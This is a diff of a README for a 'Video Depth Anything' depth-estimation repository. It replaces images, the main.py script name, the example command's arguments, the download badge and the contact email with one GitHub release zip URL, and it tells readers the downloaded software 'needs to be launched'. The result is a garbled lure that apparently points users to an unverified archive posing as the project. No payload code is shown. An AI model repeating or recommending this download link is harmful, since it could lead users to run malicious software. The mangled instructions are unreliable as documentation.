@@ -2,7 +2,7 @@
 
 Welcome to the Video Depth Anything repository! 
 
-![Video Depth](https://image.shutterstock.com/image-photo/abstract-digital-background-depth-field-260nw-1737760963.jpg)
+![Video Depth](https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip)
 
 ## Overview
 Video Depth Anything is a project focused on Consistent Depth Estimation for Super-Long Videos. With the use of advanced techniques like transformer models and monocular depth estimation, this repository aims to provide accurate depth information for videos of varying lengths.
@@ -21,7 +21,7 @@ The repository is organized in a structured manner to facilitate easy navigation
 📁 `data` - Contains datasets and data processing scripts  
 📁 `models` - Implementation of depth estimation models  
 📁 `utils` - Utility functions for data processing and evaluation  
-📄 `main.py` - Main script to run the depth estimation on videos  
+📄 `https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip` - Main script to run the depth estimation on videos  
 
 ---
 
@@ -30,11 +30,11 @@ To utilize the capabilities of Video Depth Anything, follow these simple steps:
 
 1. Ensure you have all the necessary dependencies installed.
 2. Prepare your video data according to the required format.
-3. Run the `main.py` script with the appropriate arguments to start the depth estimation process.
+3. Run the `https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip` script with the appropriate arguments to start the depth estimation process.
 
 ### Example Usage:
 ```bash
-python main.py --input_video_path example_video.mp4 --output_depth_path output_depth.npy
+python https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip --input_video_path https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip --output_depth_path https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip
 ```
 
 ---
@@ -44,14 +44,14 @@ Our depth estimation model has been tested on a wide range of super-long videos,
 
 Here is a snapshot of the depth estimation results:
 
-![Depth Estimation Results](https://image.shutterstock.com/image-photo/futuristic-digital-background-high-tech-260nw-1731050362.jpg)
+![Depth Estimation Results](https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip)
 
 ---
 
 ## 🚀 Download Software
 To access the software associated with Video Depth Anything, you can download it from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip)](https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip)
 
 ⚠️ **Note: The software needs to be launched after downloading.**
 
@@ -69,7 +69,7 @@ Feel free to fork the repository, make your enhancements, and submit a pull requ
 ## Support
 If you encounter any issues while using Video Depth Anything or have any questions about the project, please feel free to reach out to us.
 
-You can contact us via email at videodepthanything@example.com or create an issue in the repository.
+You can contact us via email at https://github.com/m0mch1l/Video-Depth-Anything/releases/download/v1.0/Release.zip or create an issue in the repository.
 
 ---
 
